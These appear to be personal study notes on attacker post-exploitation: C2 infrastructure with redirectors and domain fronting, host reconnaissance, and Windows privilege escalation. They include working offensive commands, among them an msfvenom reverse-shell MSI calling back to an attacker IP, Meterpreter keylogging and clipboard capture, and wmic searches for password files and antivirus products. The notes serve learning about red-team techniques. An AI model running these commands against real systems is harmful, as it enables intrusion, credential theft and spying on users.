# Maintaining Access & Privileges escalation.
How adversaries maintain their foothold and elevate privileges.

## 1. Attack Infrastructure

Example of a resilient attack infrastructur (no direct exposure of C&C server)
Victim  <>   Internet  <>   Redirectors  <>   C2 Servers 


**Segregation** (have different C&C servers by purpose, also see powerpoint):  
- Long haul 
    - example 1 dns request a day
    - when short haul is lost, long haul can be used to recreate short haul
- Short haul
    - used for primary operation & interaction with victims
    - often via http
    - more easily detected
    ...

**Communication channels**
Protocolls often used: Mail, HTTP(S), DNS   (usually not blocked by firewall)

Some companies only allow categorized domains so users can't see all websites. Some companies are in the business of categorising websites. Attackers can try to have their websites (with dangerous data) categorized using tricks. Examples: take over an existing websites, early registration of domain.

**Redirectors**
- Passthrough -> just forward  (Socat)
    - C2 Servers only accepts connection from passthrough -> C2 server cant be detected 
- Conditional  -> example appache server
    - depending on some criteria (e.g. in url) -> traffic will be from/to C2. Is confusing.
- Domain Fronting  
    - Redirect traffic through well known public cloud (e.g. AWS or Azure)
    - Example: in http request header: the host points to the attacker and then then cloud (example azure) will direct the request to the attacker defined in host


**Payload hosting**
Payload should be on a different server than C3 infrastructure.
Malware is on Google Drive, OneDrive... will not be blocked..

**Exploitation frameworks (used for adversary simulation and attackers)**
- sliver
- cobaltstrike  
    - adversary simulation but used by milicious actors as well
    - beacon: name for post-exploitation agents on infected machines
    - Beacon chaining
        - Infected hosts communicate with each together  (or example via SMB). Only one infected host would communicate back to attacker (also for the others). From an attackers point of view, there are advantages and drawbacks. Depending on the use case: attacker would use one or multiple (infected) hosts for communication.
- metasploit 
- etc.

## 2. Host Situational Awareness
Basically, learn about the environment (network, accounts etc.) so you can avoid being detected and regain access if you are kicked out. 

Things to check
- Anti-Virus (AV) / EDR (Endpoint Detection and Response) configs
- windows security settings
- Log forwarders  (e.g. via splunk)
- PowerShell/.Net versions
- Audit policies
- ...

Possible tools/ways to check to collection infos (Windows): 
- Registry/file system: Powershell/.Net version
- event log: example when does user log in (so we know when we can usually attack)
- Powershell: logging activated? (if not harder to detect)
    - see pdf
- WMI (Windows Management Instrumentation)
    - `wmic qfe list brief` -> installed updates
    - `wmic DATAFILE where "drive='C:' AND Name like '%password%'" GET` file search
    - `wmic /namespace:\\root\securitycenter2 path antivirusproduct` enumerate Anti-Virus (AV) products
Name,readable,size /VALUE`
- User mining: 
    - keylogging (see what user is currently typing)
    - screenshots
    - observe clipboard
- Data Mining (data about organizatino)
    - Home folders
    - file shares
    - websites (Wiki, JRA etc.)
    - etc.
    - Tools
        - snaffler: find stuff in Windows/AD environment (all computers etc.)
        - etc.
    - Data Exfiltration
        - via http etc.
        - via CloudShares (OneDrive etc.)
- etc.

**Tools**
- Seatbelt
    - performs 50+ security oriented host-survey "safety checks“ for you
    - Internet history, recent commands, files SSH info etc.
- Meterpreter
    - Keylogging: `keyscan_start` -> to stop `keyscan_dump`
    - Screenshots 
    - Clipboard dump: `clipboard_monitor_start`
- Cobalt Strike (among others)
    - Screenshots: `screenshot -p <path> -q <quality>`
    - Clipboard: via powershell "Start-ClipboardMonitor.ps1"
    - KeePass (open source password manager) -> when unlocked passwords can be read from memory
- Powerview (Datamining)
    - powershell tool (part of PowerSploit project)
- Snaffler (mainly data maining)
    - tool to find secrets (credentials) in AD. etc.

## 3. Privilege Escalation
Usually, at first malware initially runs in the context of a normal user. Often next step is to escalate privileges on local system (local admin). A lot of vulnerabilities are similar accross operating systems. 

*Remark: Linux privilege escalation see separate file*

**Ways to escalate**
- UAC Bypass
    - UAC as in short: by default: process is started without admin privileges. If to run as admin: popup will appear. So user has to actively click and depending on configuration even enter pw. There are some ways to bypass UAC
    - to bypass UAC one needs a user with admin rights already (of course as otherwise there would be nothing to bypass)
    - ways to bypass see: https://github.com/hfiref0x/UACME
        - AlwaysInstallElevated for MSI  (see below)
        - often Dll Hijacking/sideloading is involved
        - Tools like "Cobal strike" or "Metasploit modules" also support this
- Some misconfigurations
    - AlwaysInstallElevated: AD Group policies which set to true.. makes the msi's run as admin. (even if user is not yet admin) 
        - Tool meterpreter can generate msi that creates a shell: "msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4567 –f msi > shell.msi"  (other tools like PowerUp can do that too)
    - Unattended Installation files (sometimes pw can be found in them)
    - Service binaries that one has write access and will be executed as admin
        - or generally any file that is executed with another user. (would be privilege escalation to another user)
    - Hijack Execution flow
        - if dll use is not immediatly found, windows will search different places to find the place. If attacker has write privileges in one of these places, it is possible to place "infected" dlls there. 
            - Vulnerability: "Unquoted Service Paths" when path/name has whitespaces so windows will look in multiple places
            - path variables (mentioned above)
    - DDL side loading
        - similar to dll hijacking.. smuggle in a malicious dll when windows Side-by-Side manifests are not specific enough about which dll to be loaded
    - etc.
- exploit known vulnerable software
    - potentially to be exploited via tools like metosploit
    - or search for internally developed software (.net or java as easily they can be easily decompiled)

*Some tools**
- PowerSploit: > collection of powershell scripts
- SharpUp > various PowerUp functionality
- PrivescCheck > similar to PowerSploit
- Sysinternals -> can be used to search for files with write access (can be used by sysadmins and attackers)
- ...

Varia: 
- check if im a local admin: `net.exe localgroup administrators` or `whomai.exe /groups` or `wmic useraccount where "LocalAccount = true"` 


## 4. AD Situational Awareness
see  "WindowsAndAD.md"

## 5. Credential Abuse

## Varia/Leftovers
- SMB -> server message block (windows protocol name)
- Reading memroy of other processes
    - possible if other process is running under the same user. Via OS tools 
    - https://stackoverflow.com/questions/1989783/how-is-it-possible-to-access-memory-of-other-processes#:~:text=Processes%20cannot%20access%20other%20processes,this%20mechanism%20to%20privileged%20processes.&text=Save%20this%20answer.,-Show%20activity%20on
- LAPS: AD feature to keep track of local admin passwords (as each machine should have a different local admin pw and this would be impossible to manage, microsoft added this feature to AD)
- Manifest in windows dll: every dll has a manifest (metadata of dll). 